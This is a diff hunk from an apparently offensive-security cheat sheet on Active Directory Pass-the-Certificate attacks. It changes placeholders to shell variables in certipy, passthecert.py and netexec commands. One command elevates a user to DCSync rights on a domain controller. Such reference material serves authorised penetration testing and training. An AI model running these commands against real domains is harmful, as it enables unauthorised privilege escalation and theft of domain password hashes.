@@ -71,16 +71,16 @@ certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
 certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"
 
 # elevate a user for DCSYNC with passthecert.py
-passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
+passthecert.py -action "modify_user" -crt "$CERT_PATH" -key "PATH_TO_KEY" -domain "$DOMAIN" -dc-ip $DC_IP -target "$USER" -elevate
 ```
 
 You can also use [Netexec](https://github.com/Pennyw0rth/NetExec) to perform Pass-the-Certificate authentication:
 
 ```bash
-netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" -u user 
-netexec <proto> <ip> --pfx-cert "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user 
-netexec <proto> <ip> --pfx-base64 "PATH_TO_PFX_CERT" -u user 
-netexec <proto> <ip> --pem-cert "PATH_TO_CRT" --pem-key "PATH_TO_KEY" -u user 
+netexec <proto> "$TARGET" --pfx-cert "PATH_TO_PFX_CERT" -u user 
+netexec <proto> "$TARGET" --pfx-cert "PATH_TO_PFX_CERT" --pfx-pass "CERT_PASSWORD" -u user 
+netexec <proto> "$TARGET" --pfx-base64 "PATH_TO_PFX_CERT" -u user 
+netexec <proto> "$TARGET" --pem-cert $CERT_PATH --pem-key "PATH_TO_KEY" -u user 
 ```
 
 
